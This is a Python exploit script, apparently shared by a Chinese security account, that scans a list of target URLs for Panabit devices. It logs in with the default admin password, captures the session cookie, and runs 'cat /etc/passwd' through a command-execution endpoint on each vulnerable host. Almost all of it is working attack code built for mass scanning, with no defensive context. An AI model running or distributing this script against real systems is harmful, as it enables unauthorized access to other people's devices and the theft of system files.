import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    url = target_url + "/login/userverify.cgi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept - Encoding": "gzip, deflate",
        "Accept - Language":  "zh - CN, zh;q = 0.9",

    }
    data ="action=user_login&palang=ch&username=admin&password=722289d072731e2cc73038aa9ad9e067&code="
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.post(url=url, headers=headers, data=data, verify=False, timeout=10)
        if "Auth_OK" in r.text and r.status_code == 200:
            print("\033[32m[o] 目标 {} 存在漏洞弱口令漏洞\n 账号为：admin\n 密码为：panabit \033[0m".format(target_url))
            cookie = r.headers['Set-Cookie']
            print("\033[31m[o] 获取Cookie : {} \033[0m".format(cookie))
            POC_2(target_url, cookie)
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


def POC_2(target_url, Cookie):
    url = target_url + "/cgi-bin/Maintain/ajax_top?action=runcmd&cmd=cat /etc/passwd"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "{}".format(Cookie)
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.post(url=url, headers=headers, verify=False, timeout=5)
        if 'root' in r.text and r.status_code == 200:
            print("\033[31m[o] 目标 {}存在漏洞 ,执行 cat /etc/passwd \033[0m".format(target_url))
            print("\033[31m[o] 内容:\n{} \033[0m".format(r.text))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)



def xcan(file):
    with open(file, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name = str(input("\033[36m请输入文件路劲\ntxt.路劲 >>> \033[0m"))
    xcan(file_name)